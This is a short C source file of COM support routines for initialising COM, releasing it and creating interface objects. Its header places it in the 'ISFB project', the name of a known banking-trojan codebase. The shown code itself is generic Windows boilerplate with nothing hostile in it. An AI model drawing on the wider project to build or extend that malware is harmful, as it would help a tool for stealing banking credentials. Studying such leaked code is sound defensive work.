//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: comsup.c
// $Revision: 191 $
// $Date: 2014-02-05 14:33:15 +0300 (Ср, 05 фев 2014) $
// description:
//	COM interfaces support routines.


#include	"..\common\common.h"

//
//	Initializes COM for the calling thread.
//
BOOL ComInit(
	HRESULT* phRes
	)
{
	BOOL	Ret = FALSE;
	HRESULT	hRes;

	hRes = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (hRes == S_OK || hRes == S_FALSE || hRes == RPC_E_CHANGED_MODE)
	{
		*phRes = hRes;
		Ret = TRUE;
	}

	return(Ret);
}


//
//	Releases COM for the calling thread.
//
VOID ComUninit(
	HRESULT	hRes
	)
{
	if (hRes == S_OK || hRes == S_FALSE)
		CoUninitialize();
}


//
//	Creates COM interface object.
//
PVOID ComCreateInterface(
	REFCLSID	ClsId, 
	REFIID		RefId
	)
{
  PVOID pInterface;

  if (CoCreateInstance(ClsId, NULL, CLSCTX_INPROC_SERVER | CLSCTX_NO_FAILURE_LOG | CLSCTX_NO_CODE_DOWNLOAD, RefId, &pInterface) != S_OK)
	  pInterface = NULL;

  return(pInterface);
}
